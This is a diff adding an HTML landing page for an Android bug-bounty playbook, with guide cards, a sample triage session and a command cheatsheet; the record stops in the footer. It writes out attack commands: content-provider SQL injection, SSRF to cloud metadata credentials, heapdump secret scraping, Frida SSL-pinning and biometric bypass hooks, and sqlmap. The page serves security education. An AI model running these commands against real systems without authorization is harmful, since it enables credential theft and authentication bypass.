@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AndroidAcid — Bug Bounty Playbook</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+:root {
+  --g:   #00ff88;
+  --gd:  #00cc66;
+  --gg:  rgba(0,255,136,0.08);
+  --r:   #ff3355;
+  --o:   #ff9900;
+  --b:   #00ccff;
+  --bg:  #030a05;
+  --bg2: #060f08;
+  --s:   #0a1a0d;
+  --brd: #1a3320;
+  --t:   #c8e6c9;
+  --td:  #4a7a55;
+  --mono:'Share Tech Mono',monospace;
+  --disp:'Orbitron',sans-serif;
+  --body:'Rajdhani',sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--t);font-family:var(--body);overflow-x:hidden;cursor:crosshair}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.012) 2px,rgba(0,255,136,.012) 4px);pointer-events:none;z-index:1000}
+
+/* NAV */
+nav{position:fixed;top:0;left:0;right:0;z-index:900;background:rgba(3,10,5,.92);backdrop-filter:blur(8px);border-bottom:1px solid var(--brd);padding:.7rem 2rem;display:flex;align-items:center;justify-content:space-between}
+.nav-logo{font-family:var(--disp);font-size:.7rem;letter-spacing:.25em;color:var(--g);text-decoration:none}
+.nav-links{display:flex;gap:1.5rem;align-items:center}
+.nav-links a{font-family:var(--mono);font-size:.6rem;letter-spacing:.15em;color:var(--td);text-decoration:none;text-transform:uppercase;transition:color .2s}
+.nav-links a:hover{color:var(--g)}
+
+/* HERO */
+header{position:relative;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:6rem 2rem 4rem;overflow:hidden}
+.grid-bg{position:absolute;inset:0;background-image:linear-gradient(rgba(0,255,136,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,.04) 1px,transparent 1px);background-size:40px 40px;animation:gridScroll 20s linear infinite}
+@keyframes gridScroll{to{background-position:40px 40px}}
+.corner{position:absolute;width:50px;height:50px;border-color:var(--g);border-style:solid;opacity:.5}
+.corner-tl{top:5rem;left:2rem;border-width:2px 0 0 2px}
+.corner-tr{top:5rem;right:2rem;border-width:2px 2px 0 0}
+.corner-bl{bottom:2rem;left:2rem;border-width:0 0 2px 2px}
+.corner-br{bottom:2rem;right:2rem;border-width:0 2px 2px 0}
+.eyebrow{font-family:var(--mono);font-size:.65rem;letter-spacing:.4em;color:var(--g);margin-bottom:1rem}
+h1{font-family:var(--disp);font-size:clamp(2.5rem,8vw,6rem);font-weight:900;line-height:.9;color:#fff;text-shadow:0 0 60px rgba(0,255,136,.15);margin-bottom:.3em;position:relative}
+h1 em{color:var(--g);font-style:normal}
+.glitch::before,.glitch::after{content:attr(data-text);position:absolute;top:0;left:0;width:100%;font-family:inherit;font-size:inherit;font-weight:inherit;line-height:inherit}
+.glitch::before{color:var(--r);animation:g1 5s infinite;clip-path:polygon(0 28%,100% 28%,100% 46%,0 46%);opacity:0}
+.glitch::after{color:var(--b);animation:g2 5s infinite;clip-path:polygon(0 60%,100% 60%,100% 76%,0 76%);opacity:0}
+@keyframes g1{0%,90%,100%{transform:translate(0);opacity:0}92%{transform:translate(-3px,1px);opacity:.7}94%{transform:translate(2px,-1px);opacity:.7}96%{transform:translate(0);opacity:0}}
+@keyframes g2{0%,87%,100%{transform:translate(0);opacity:0}89%{transform:translate(3px,2px);opacity:.5}91%{transform:translate(-2px,-1px);opacity:.5}93%{transform:translate(0);opacity:0}}
+.tagline{font-family:var(--mono);font-size:.75rem;letter-spacing:.25em;color:var(--td);margin-top:1.5rem}
+.cta-row{display:flex;gap:1rem;margin-top:2.5rem;flex-wrap:wrap;justify-content:center}
+.btn{font-family:var(--mono);font-size:.7rem;letter-spacing:.2em;padding:.8rem 1.8rem;text-decoration:none;text-transform:uppercase;transition:all .2s;clip-path:polygon(7px 0%,100% 0%,calc(100% - 7px) 100%,0% 100%)}
+.btn-o{border:1px solid var(--brd);color:var(--td)}.btn-o:hover{border-color:var(--g);color:var(--g)}
+
+/* COFFEE BUTTON */
+.btn-coffee{background:transparent;border:1px solid rgba(255,153,0,.4);color:var(--o);font-family:var(--mono);font-size:.7rem;letter-spacing:.2em;padding:.8rem 1.8rem;text-decoration:none;text-transform:uppercase;transition:all .2s;clip-path:polygon(7px 0%,100% 0%,calc(100% - 7px) 100%,0% 100%);display:inline-flex;align-items:center;gap:.5rem}
+.btn-coffee:hover{background:rgba(255,153,0,.1);border-color:var(--o);box-shadow:0 0 20px rgba(255,153,0,.2);color:var(--o)}
+
+/* COFFEE BANNER */
+.coffee-banner{background:var(--s);border:1px solid rgba(255,153,0,.2);border-left:3px solid var(--o);padding:1rem 1.5rem;display:flex;align-items:center;justify-content:space-between;gap:1.5rem;flex-wrap:wrap;margin:2rem 0}
+.coffee-banner-text{font-family:var(--mono);font-size:.65rem;color:var(--td);letter-spacing:.08em;line-height:1.8}
+.coffee-banner-text strong{color:var(--o);display:block;font-size:.7rem;letter-spacing:.15em;margin-bottom:.25rem}
+.coffee-link{font-family:var(--mono);font-size:.6rem;letter-spacing:.15em;color:var(--o);text-decoration:none;border:1px solid rgba(255,153,0,.4);padding:.5rem 1.2rem;white-space:nowrap;transition:all .2s;clip-path:polygon(5px 0%,100% 0%,calc(100% - 5px) 100%,0% 100%)}
+.coffee-link:hover{background:rgba(255,153,0,.1);box-shadow:0 0 15px rgba(255,153,0,.15)}
+
+/* STATS */
+.stats-strip{background:var(--s);border-top:1px solid var(--brd);border-bottom:1px solid var(--brd);padding:1.2rem 2rem;display:flex;justify-content:center;gap:3rem;flex-wrap:wrap}
+.stat{text-align:center}
+.stat-num{font-family:var(--disp);font-size:1.8rem;font-weight:700;color:var(--g);display:block;line-height:1}
+.stat-label{font-family:var(--mono);font-size:.55rem;color:var(--td);letter-spacing:.2em;margin-top:.3rem;text-transform:uppercase}
+
+/* LAYOUT */
+main{padding:0 max(2rem,5vw);max-width:1280px;margin:0 auto}
+section{padding:4rem 0}
+.section-header{display:flex;align-items:center;gap:1rem;margin-bottom:2.5rem}
+.section-tag{font-family:var(--mono);font-size:.6rem;color:var(--g);letter-spacing:.3em;background:rgba(0,255,136,.05);border:1px solid rgba(0,255,136,.15);padding:.3rem .8rem;white-space:nowrap}
+.section-line{flex:1;height:1px;background:var(--brd)}
+h2{font-family:var(--disp);font-size:clamp(1.2rem,3vw,2rem);font-weight:700;color:#fff;margin-bottom:.3rem}
+h2 em{color:var(--g);font-style:normal}
+.section-sub{font-family:var(--mono);font-size:.7rem;color:var(--td);letter-spacing:.08em;margin-bottom:2.5rem;line-height:1.8}
+.section-sub code{color:var(--g);background:rgba(0,255,136,.07);padding:.1rem .3rem;font-size:.65rem}
+
+/* GUIDE CARDS */
+.guides-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:1px;background:var(--brd);border:1px solid var(--brd)}
+.guide-card{background:var(--bg2);text-decoration:none;color:inherit;display:flex;flex-direction:column;position:relative;overflow:hidden;transition:background .2s}
+.guide-card:hover{background:var(--s)}
+.guide-card::before{content:'';position:absolute;top:0;left:0;width:3px;height:0;background:var(--g);transition:height .3s}
+.guide-card:hover::before{height:100%}
+.card-top{padding:1.5rem 1.5rem 1rem;flex:1}
+.card-meta{display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem}
+.card-num{font-family:var(--mono);font-size:.55rem;color:var(--td);letter-spacing:.2em}
+.card-sev{font-family:var(--mono);font-size:.55rem;letter-spacing:.1em;padding:.2rem .5rem;border:1px solid;text-transform:uppercase}
+.sev-c{color:var(--r);border-color:rgba(255,51,85,.35)}
+.sev-h{color:var(--o);border-color:rgba(255,153,0,.35)}
+.sev-m{color:var(--g);border-color:rgba(0,255,136,.3)}
+.card-icon-row{display:flex;align-items:center;gap:.8rem;margin-bottom:.8rem}
+.card-icon{font-size:1.6rem}
+.guide-card h3{font-family:var(--disp);font-size:.9rem;font-weight:700;color:#fff;letter-spacing:.05em}
+.guide-card p{font-size:.85rem;color:var(--td);line-height:1.65;margin-top:.5rem}
+.card-preview{margin:1rem 1.5rem 0;background:#000;border:1px solid var(--brd);padding:.8rem;font-family:var(--mono);font-size:.6rem;color:#5a8f66;line-height:1.75;border-left:2px solid var(--g)}
+.card-preview .cmd{color:#fff}
+.card-preview .cmt{color:var(--td)}
+.card-preview .ok{color:var(--g)}
+.card-preview .err{color:var(--r)}
+.card-bottom{padding:1rem 1.5rem;border-top:1px solid var(--brd);display:flex;justify-content:space-between;align-items:center}
+.card-tags{display:flex;flex-wrap:wrap;gap:.3rem}
+.tag{font-family:var(--mono);font-size:.5rem;letter-spacing:.08em;padding:.15rem .4rem;border:1px solid var(--brd);color:var(--td);text-transform:uppercase}
+.card-link{font-family:var(--mono);font-size:.6rem;color:var(--g);letter-spacing:.1em}
+.guide-card:hover .card-link{text-decoration:underline}
+
+/* TERMINAL */
+.terminal{background:#000;border:1px solid var(--brd);overflow:hidden;margin:2rem 0}
+.term-hdr{background:var(--s);padding:.55rem 1rem;display:flex;align-items:center;gap:.4rem;border-bottom:1px solid var(--brd)}
+.dot{width:9px;height:9px;border-radius:50%}
+.dot-r{background:#ff3355}.dot-y{background:#ff9900}.dot-g{background:#00ff88}
+.term-title{font-family:var(--mono);font-size:.6rem;color:var(--td);letter-spacing:.1em;margin-left:.4rem}
+.term-body{padding:1.2rem 1.5rem;font-family:var(--mono);font-size:.75rem;line-height:1.9;color:#6a9977}
+.tp{color:var(--g)}.tc{color:#fff}.tm{color:var(--td)}.to{color:var(--o)}.ts{color:var(--g)}.te{color:var(--r)}
+.cursor{display:inline-block;width:7px;height:.9em;background:var(--g);vertical-align:text-bottom;animation:blink 1s step-end infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+
+/* ADD A PAGE */
+.add-page-section{background:var(--s);border:1px solid var(--brd);padding:3rem;position:relative;overflow:hidden}
+.add-page-section::after{content:'HOW TO ADD A PAGE';position:absolute;top:1.5rem;right:2rem;font-family:var(--mono);font-size:.5rem;letter-spacing:.3em;color:rgba(0,255,136,.12)}
+.steps-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1px;background:var(--brd);margin-top:2rem}
+.step{background:var(--bg);padding:1.5rem;position:relative}
+.step-num{font-family:var(--disp);font-size:2.5rem;font-weight:900;color:rgba(0,255,136,.07);position:absolute;top:.8rem;right:1rem;line-height:1}
+.step h4{font-family:var(--disp);font-size:.65rem;letter-spacing:.1em;color:var(--g);margin-bottom:.8rem;text-transform:uppercase}
+.step p{font-family:var(--mono);font-size:.65rem;color:var(--td);line-height:1.85}
+.step p code{color:#fff;background:rgba(0,255,136,.07);padding:.1rem .3rem;border:1px solid rgba(0,255,136,.15)}
+.template-box{margin-top:2.5rem}
+.template-box h4{font-family:var(--disp);font-size:.65rem;letter-spacing:.1em;color:var(--g);margin-bottom:1rem;text-transform:uppercase}
+pre.template{background:#000;border:1px solid var(--brd);border-left:2px solid var(--g);padding:1.5rem;font-family:var(--mono);font-size:.65rem;color:#6a9977;line-height:1.9;overflow-x:auto;white-space:pre}
+.tk{color:var(--g)}.tv{color:#fff}.tc2{color:var(--td)}
+
+/* QUICK REF */
+.ref-cols{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:2rem;margin-top:1.5rem}
+.ref-group h4{font-family:var(--disp);font-size:.6rem;letter-spacing:.1em;color:var(--g);text-transform:uppercase;padding-bottom:.5rem;border-bottom:1px solid var(--brd);margin-bottom:.8rem}
+.ref-item{font-family:var(--mono);font-size:.62rem;color:var(--td);padding:.35rem 0;border-bottom:1px solid rgba(26,51,32,.4);display:flex;gap:.6rem;align-items:baseline}
+.ref-item::before{content:'$';color:var(--brd);flex-shrink:0}
+.ref-item code{color:var(--t);font-size:.58rem}
+
+/* FOOTER */
+footer{border-top:1px solid var(--brd);padding:2rem;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:1rem;font-family:var(--mono);font-size:.6rem;color:var(--td);letter-spacing:.1em}
+footer a{color:var(--g);text-decoration:none}
+.f-logo{font-family:var(--disp);font-size:.75rem;color:var(--g);margin-bottom:.3rem;letter-spacing:.2em}
+
+/* ANIM */
+.fade{opacity:0;transform:translateY(24px);transition:opacity .6s,transform .6s}
+.fade.in{opacity:1;transform:translateY(0)}
+@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.a1{opacity:0;animation:fadeUp .7s .3s forwards}
+.a2{opacity:0;animation:fadeUp .7s .6s forwards}
+.a3{opacity:0;animation:fadeUp .7s .9s forwards}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <a class="nav-logo" href="#">ANDROIDACID</a>
+  <div class="nav-links">
+    <a href="#guides">Guides</a>
+    <a href="#tools">Tools</a>
+    <a href="https://github.com/AndroidAcid/AndroidAcid.github.io" target="_blank">GitHub ↗</a>
+    <a href="https://buymeacoffee.com/androidacid" target="_blank" style="color:var(--o);border:1px solid rgba(255,153,0,.3);padding:.2rem .6rem">☕ COFFEE</a>
+  </div>
+</nav>
+
+<!-- HERO -->
+<header>
+  <div class="grid-bg"></div>
+  <div class="corner corner-tl"></div><div class="corner corner-tr"></div>
+  <div class="corner corner-bl"></div><div class="corner corner-br"></div>
+
+  <div class="a1">
+    <div class="eyebrow">// Android Bug Bounty Playbook</div>
+    <h1 class="glitch" data-text="ANDROIDACID">ANDROID<em>ACID</em></h1>
+    <div class="tagline">STATIC ANALYSIS &nbsp;·&nbsp; DYNAMIC TESTING &nbsp;·&nbsp; MANUAL HUNTING &nbsp;·&nbsp; REPORT</div>
+  </div>
+
+  <div class="cta-row a2">
+    <a href="https://github.com/AndroidAcid/AndroidAcid.github.io/blob/main/Playbook/android-static-analysis-guide.md" class="btn btn-o">START: STATIC ANALYSIS</a>
+    <a href="#guides" class="btn btn-o">ALL GUIDES</a>
+    <a href="https://buymeacoffee.com/androidacid" target="_blank" class="btn-coffee">☕ BUY ME A COFFEE</a>
+  </div>
+</header>
+
+<!-- STATS -->
+<div class="stats-strip a3">
+  <div class="stat"><span class="stat-num" data-target="6">0</span><div class="stat-label">Guides Live</div></div>
+  <div class="stat"><span class="stat-num" data-target="10">0</span><div class="stat-label">Attack Phases</div></div>
+  <div class="stat"><span class="stat-num" data-target="14">0</span><div class="stat-label">PoC Examples</div></div>
+  <div class="stat"><span class="stat-num" data-target="60">0</span><div class="stat-label">Grep Commands</div></div>
+</div>
+
+<!-- ═══════════════ GUIDES ═══════════════ -->
+<main>
+<section id="guides" class="fade">
+  <div class="section-header">
+    <div class="section-tag">01 // The Playbook</div>
+    <div class="section-line"></div>
+  </div>
+  <h2>CURRENT <em>GUIDES</em></h2>
+  <p class="section-sub">
+    Each guide covers setup → methodology → grep commands → PoC → severity table. Read in order or jump to the phase you need.
+  </p>
+
+  <div class="guides-grid">
+
+    <!-- GUIDE 01 -->
+    <a href="https://github.com/AndroidAcid/AndroidAcid.github.io/blob/main/Playbook/android-static-analysis-guide.md" class="guide-card">
+      <div class="card-top">
+        <div class="card-meta">
+          <span class="card-num">// GUIDE 01</span>
+          <span class="card-sev sev-h">HIGH YIELD</span>
+        </div>
+        <div class="card-icon-row">
+          <span class="card-icon">🔬</span>
+          <h3>STATIC CODE REVIEW</h3>
+        </div>
+        <p>10-phase manual for decompiling APKs and finding bugs without touching a device. Covers manifest audit, hardcoded secrets, insecure storage, network misconfigs, crypto flaws, and IPC. Includes full grep cheatsheet and severity reference table.</p>
+      </div>
+      <div class="card-preview">
+        <div><span class="cmt"># Decompile → scan for AWS keys</span></div>
+        <div><span class="cmd">jadx -d jadx/ target.apk</span></div>
+        <div><span class="cmd">grep -rn 'AKIA[0-9A-Z]{16}' jadx/</span></div>
+        <div><span class="ok">→ AWSHelper.java:12: "AKIAIOSFODNN7EXAMPLE"</span></div>
+        <div><span class="ok">→ Critical — validate with: aws sts get-caller-identity</span></div>
+      </div>
+      <div class="card-bottom">
+        <div class="card-tags">
+          <span class="tag">apktool</span><span class="tag">jadx</span><span class="tag">trufflehog</span><span class="tag">10 phases</span>
+        </div>
+        <span class="card-link">READ →</span>
+      </div>
+    </a>
+
+    <!-- GUIDE 02 -->
+    <a href="https://github.com/AndroidAcid/AndroidAcid.github.io/blob/main/Playbook/android-static-poc-examples.md" class="guide-card">
+      <div class="card-top">
+        <div class="card-meta">
+          <span class="card-num">// GUIDE 02</span>
+          <span class="card-sev sev-c">CRITICAL PoCs</span>
+        </div>
+        <div class="card-icon-row">
+          <span class="card-icon">💥</span>
+          <h3>STATIC PoC EXAMPLES</h3>
+        </div>
+        <p>14 real vulnerability patterns — each shows the vulnerable Java/Kotlin code, the grep command to find it, an adb/curl exploit, and a copy-paste report impact statement. Also includes a full run-on-every-APK cheatsheet and a triage decision table.</p>
+      </div>
+      <div class="card-preview">
+        <div><span class="cmt"># Exported activity auth bypass</span></div>
+        <div><span class="cmd">adb shell am start -n com.target.app/.ui.AdminActivity</span></div>
+        <div><span class="ok">→ Admin panel opens. No auth required.</span></div>
+        <div><span class="cmt"># ContentProvider SQL injection</span></div>
+        <div><span class="cmd">adb shell content query --uri content://com.pkg/users \</span></div>
+        <div><span class="cmd">  --where "1=1 UNION SELECT user,pass,3 FROM sqlite_master--"</span></div>
+      </div>
+      <div class="card-bottom">
+        <div class="card-tags">
+          <span class="tag">14 PoCs</span><span class="tag">adb</span><span class="tag">firebase</span><span class="tag">sqli</span><span class="tag">webview</span>
+        </div>
+        <span class="card-link">READ →</span>
+      </div>
+    </a>
+
+    <!-- GUIDE 03 -->
+    <a href="https://github.com/AndroidAcid/AndroidAcid.github.io/blob/main/Playbook/Manual_Bug_Hunting_Guide.md" class="guide-card">
+      <div class="card-top">
+        <div class="card-meta">
+          <span class="card-num">// GUIDE 03</span>
+          <span class="card-sev sev-h">API LAYER</span>
+        </div>
+        <div class="card-icon-row">
+          <span class="card-icon">🌐</span>
+          <h3>MANUAL HUNTING GUIDE</h3>
+        </div>
+        <p>API and web layer hunting: recon, IDOR, broken auth, SSRF to cloud credentials, SQL/command injection, business logic, race conditions, GraphQL, XSS, open redirect. Every technique has curl commands, a proof template, and the 7-question triage gate.</p>
+      </div>
+      <div class="card-preview">
+        <div><span class="cmt"># SSRF → AWS IMDSv1 credentials</span></div>
+        <div><span class="cmd">curl "https://api.target.com/fetch?url=</span></div>
+        <div><span class="cmd">  http://169.254.169.254/latest/meta-data/</span></div>
+        <div><span class="cmd">  iam/security-credentials/ec2-role"</span></div>
+        <div><span class="ok">→ AccessKeyId: ASIAIOSFODNN7...  ← Critical</span></div>
+      </div>
+      <div class="card-bottom">
+        <div class="card-tags">
+          <span class="tag">idor</span><span class="tag">ssrf</span><span class="tag">jwt</span><span class="tag">race</span><span class="tag">graphql</span>
+        </div>
+        <span class="card-link">READ →</span>
+      </div>
+    </a>
+
+    <!-- GUIDE 04 -->
+    <a href="https://github.com/AndroidAcid/AndroidAcid.github.io/blob/main/Playbook/advanced-techniques.md" class="guide-card">
+      <div class="card-top">
+        <div class="card-meta">
+          <span class="card-num">// GUIDE 04</span>
+          <span class="card-sev sev-c">ADVANCED</span>
+        </div>
+        <div class="card-icon-row">
+          <span class="card-icon">⚗️</span>
+          <h3>ADVANCED TECHNIQUES</h3>
+        </div>
+        <p>Bug chaining (A→B→C), framework-specific playbooks (Next.js, Laravel, Spring Boot, Django, Rails, GraphQL), CI/CD pipeline attacks (GitHub Actions, Jenkins), timing side-channels, WebSocket security, and cloud misconfigs across AWS, GCP, and Azure.</p>
+      </div>
+      <div class="card-preview">
+        <div><span class="cmt"># Spring Boot actuator → heap dump → secrets</span></div>
+        <div><span class="cmd">curl -s https://target.com/actuator/heapdump -o heap.bin</span></div>
+        <div><span class="cmd">strings heap.bin | grep -i "password\|secret\|token"</span></div>
+        <div><span class="ok">→ db.password=Pr0d$ecret99</span></div>
+        <div><span class="err">→ STRIPE_SECRET_KEY=sk_live_4eC39H... ← Critical</span></div>
+      </div>
+      <div class="card-bottom">
+        <div class="card-tags">
+          <span class="tag">chaining</span><span class="tag">ci/cd</span><span class="tag">aws/gcp</span><span class="tag">timing</span><span class="tag">websocket</span>
+        </div>
+        <span class="card-link">READ →</span>
+      </div>
+    </a>
+
+    <!-- GUIDE 05 -->
+    <a href="https://github.com/AndroidAcid/AndroidAcid.github.io/blob/main/Playbook/frida-bug-hunting-guide.md" class="guide-card">
+      <div class="card-top">
+        <div class="card-meta">
+          <span class="card-num">// GUIDE 05</span>
+          <span class="card-sev sev-c">DYNAMIC</span>
+        </div>
+        <div class="card-icon-row">
+          <span class="card-icon">🪝</span>
+          <h3>FRIDA BUG HUNTING</h3>
+        </div>
+        <p>Runtime instrumentation for Android bug bounty: SSL pinning bypass, root detection defeat, biometric bypass, hooking auth methods, intercepting crypto keys in memory, and tracing sensitive API calls live. Includes reusable scripts for common targets.</p>
+      </div>
+      <div class="card-preview">
+        <div><span class="cmt"># Attach to running app, bypass SSL pinning</span></div>
+        <div><span class="cmd">frida -U -f com.target.app --no-pause -l ssl_bypass.js</span></div>
+        <div><span class="ok">→ [*] Pinning disabled. Traffic flowing to Burp.</span></div>
+        <div><span class="cmt"># Hook auth method — force return true</span></div>
+        <div><span class="cmd">Java.use("com.target.app.auth.BiometricHelper")</span></div>
+        <div><span class="cmd">  .isAuthenticated.implementation = () => true;</span></div>
+      </div>
+      <div class="card-bottom">
+        <div class="card-tags">
+          <span class="tag">frida</span><span class="tag">objection</span><span class="tag">ssl-bypass</span><span class="tag">hooking</span><span class="tag">runtime</span>
+        </div>
+        <span class="card-link">READ →</span>
+      </div>
+    </a>
+
+    <!-- GUIDE 06 -->
+    <a href="https://github.com/AndroidAcid/AndroidAcid.github.io/blob/main/Playbook/radare2-bug-hunting-playbook.md" class="guide-card">
+      <div class="card-top">
+        <div class="card-meta">
+          <span class="card-num">// GUIDE 06</span>
+          <span class="card-sev sev-h">REVERSE ENG</span>
+        </div>
+        <div class="card-icon-row">
+          <span class="card-icon">🔩</span>
+          <h3>RADARE2 TUTORIAL</h3>
+        </div>
+        <p>Binary reverse engineering for Android native libraries (.so files): r2 basics, disassembly navigation, finding hardcoded strings and keys, patching binaries to bypass checks, analysing obfuscated native code, and extracting crypto material from memory.</p>
+      </div>
+      <div class="card-preview">
+        <div><span class="cmt"># Open native lib, analyse all functions</span></div>
+        <div><span class="cmd">r2 -A target_apktool/lib/arm64-v8a/libnative.so</span></div>
+        <div><span class="cmd">[0x0]> afl | grep -i "check\|auth\|license\|key"</span></div>
+        <div><span class="ok">→ sym.check_license  0x00003f40</span></div>
+        <div><span class="cmd">[0x0]> s sym.check_license; pdf</span></div>
+        <div><span class="ok">→ Disassembly: strcmp → hardcoded key found</span></div>
+      </div>
+      <div class="card-bottom">
+        <div class="card-tags">
+          <span class="tag">radare2</span><span class="tag">r2</span><span class="tag">native .so</span><span class="tag">disasm</span><span class="tag">patching</span>
+        </div>
+        <span class="card-link">READ →</span>
+      </div>
+    </a>
+
+  </div>
+
+  <!-- COFFEE BANNER — after guides grid -->
+  <div class="coffee-banner">
+    <div class="coffee-banner-text">
+      <strong>☕ SUPPORT THE PLAYBOOK</strong>
+      These guides are free and always will be. If they helped you land a bounty, a coffee keeps new guides coming.
+    </div>
+    <a href="https://buymeacoffee.com/androidacid" target="_blank" class="coffee-link">BUY ME A COFFEE →</a>
+  </div>
+
+</section>
+
+<!-- ═══════════════ TERMINAL ═══════════════ -->
+<section id="tools" class="fade">
+  <div class="section-header">
+    <div class="section-tag">02 // First 30 Minutes</div>
+    <div class="section-line"></div>
+  </div>
+  <h2>EVERY <em>NEW APK</em></h2>
+  <p class="section-sub">Run this before anything else. Two Criticals before touching the device is not unusual.</p>
+
+  <div class="terminal">
+    <div class="term-hdr">
+      <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+      <div class="term-title">bash — androidacid initial triage</div>
+    </div>
+    <div class="term-body">
+      <div><span class="tp">~/target $</span> <span class="tc">adb shell pm path com.target.app</span></div>
+      <div><span class="to">package:/data/app/com.target.app-1/base.apk</span></div>
+      <div><span class="tp">~/target $</span> <span class="tc">adb pull /data/app/com.target.app-1/base.apk ./target.apk</span></div>
+      <div><span class="ts">[ ✓ ] 18.4 MB pulled</span></div>
+      <div><span class="tp">~/target $</span> <span class="tc">apktool d target.apk -o src/ && jadx -d jadx/ target.apk</span></div>
+      <div><span class="ts">[ ✓ ] 847 Java classes extracted</span></div>
+      <div>&nbsp;</div>
+      <div><span class="tm"># Phase 1: Manifest — highest ROI file, read it first</span></div>
+      <div><span class="tp">~/target $</span> <span class="tc">grep -n 'exported="true"\|debuggable\|allowBackup\|cleartext' src/AndroidManifest.xml</span></div>
+      <div><span class="te">L12:  android:debuggable="true"                       ← Critical (RCE via jdwp)</span></div>
+      <div><span class="te">L31:  android:exported="true" (.ui.AdminActivity)     ← High (auth bypass)</span></div>
+      <div><span class="te">L44:  android:allowBackup="true"                      ← Medium (data extraction)</span></div>
+      <div>&nbsp;</div>
+      <div><span class="tm"># Phase 2: Secrets scan</span></div>
+      <div><span class="tp">~/target $</span> <span class="tc">grep -rn 'AKIA[0-9A-Z]{16}' jadx/</span></div>
+      <div><span class="te">AWSHelper.java:12: ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"</span></div>
+      <div><span class="tp">~/target $</span> <span class="tc">aws sts get-caller-identity</span></div>
+      <div><span class="ts">{ "Account": "123456789012", "UserId": "AIDA...", "Arn": "arn:aws:iam::123456789012:user/app-prod" }</span></div>
+      <div>&nbsp;</div>
+      <div><span class="tm"># That's two Criticals before the device is even rooted.</span></div>
+      <div><span class="tp">~/target $</span> <span class="cursor"></span></div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════ QUICK REF ═══════════════ -->
+<section id="ref" class="fade">
+  <div class="section-header">
+    <div class="section-tag">04 // Cheatsheet</div>
+    <div class="section-line"></div>
+  </div>
+  <h2>TOOL <em>QUICK REF</em></h2>
+  <p class="section-sub">The commands you type on every engagement. Full lists with grep patterns are in each guide.</p>
+
+  <div class="ref-cols">
+    <div class="ref-group">
+      <h4>⬡ APK Prep</h4>
+      <div class="ref-item"><code>apktool d target.apk -o src/</code></div>
+      <div class="ref-item"><code>jadx -d jadx/ target.apk</code></div>
+      <div class="ref-item"><code>adb pull /data/app/com.pkg-1/base.apk .</code></div>
+      <div class="ref-item"><code>d2j-dex2jar target.apk -o target.jar</code></div>
+      <div class="ref-item"><code>strings lib.so | grep -i "key\|secret\|http"</code></div>
+    </div>
+    <div class="ref-group">
+      <h4>⬡ Manifest</h4>
+      <div class="ref-item"><code>grep -n 'exported="true"' AndroidManifest.xml</code></div>
+      <div class="ref-item"><code>grep -n 'debuggable\|allowBackup' AndroidManifest.xml</code></div>
+      <div class="ref-item"><code>grep -n 'uses-permission' AndroidManifest.xml</code></div>
+      <div class="ref-item"><code>grep -n 'cleartext\|networkSecurityConfig' *.xml</code></div>
+      <div class="ref-item"><code>grep -n 'android:scheme' AndroidManifest.xml</code></div>
+    </div>
+    <div class="ref-group">
+      <h4>⬡ Secrets</h4>
+      <div class="ref-item"><code>grep -rn 'AKIA[0-9A-Z]{16}' jadx/</code></div>
+      <div class="ref-item"><code>grep -rn 'AIza[0-9A-Za-z_-]{35}' jadx/</code></div>
+      <div class="ref-item"><code>grep -rn 'sk_live_\|pk_live_' jadx/</code></div>
+      <div class="ref-item"><code>trufflehog filesystem jadx/ --only-verified</code></div>
+      <div class="ref-item"><code>gitleaks detect --source jadx/ --no-git</code></div>
+    </div>
+    <div class="ref-group">
+      <h4>⬡ ADB Exploits</h4>
+      <div class="ref-item"><code>adb shell am start -n com.pkg/.ActivityName</code></div>
+      <div class="ref-item"><code>adb shell content query --uri content://com.pkg/</code></div>
+      <div class="ref-item"><code>adb shell am broadcast -a com.pkg.ACTION</code></div>
+      <div class="ref-item"><code>adb shell run-as com.pkg ls /data/data/com.pkg/</code></div>
+      <div class="ref-item"><code>adb backup -f out.ab -noapk com.pkg</code></div>
+    </div>
+    <div class="ref-group">
+      <h4>⬡ Dynamic</h4>
+      <div class="ref-item"><code>frida -U -f com.pkg --no-pause -l ssl_bypass.js</code></div>
+      <div class="ref-item"><code>objection -g com.pkg explore</code></div>
+      <div class="ref-item"><code>drozer console connect</code></div>
+      <div class="ref-item"><code>adb jdwp  (then: adb forward tcp:8700 jdwp:PID)</code></div>
+      <div class="ref-item"><code>adb logcat | grep -iE "token|password|secret"</code></div>
+    </div>
+    <div class="ref-group">
+      <h4>⬡ Network / Cloud</h4>
+      <div class="ref-item"><code>curl "https://proj.firebaseio.com/.json"</code></div>
+      <div class="ref-item"><code>aws sts get-caller-identity</code></div>
+      <div class="ref-item"><code>curl http://169.254.169.254/latest/meta-data/iam/</code></div>
+      <div class="ref-item"><code>sqlmap -u "URL?id=1" --dbs --batch</code></div>
+      <div class="ref-item"><code>curl https://target.com/actuator/env</code></div>
+    </div>
+  </div>
+</section>
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div>
+    <div class="f-logo">ANDROIDACID</div>
+    <div>Bug Bounty Playbook &nbsp;·&nbsp; Educational use only &nbsp;·&nbsp; Hunt responsibly</div>
+  </div>
+  <div style="text-align:right">
+    <a href="https://github.com/AndroidAcid/AndroidAcid.github.io">GitHub →</a>
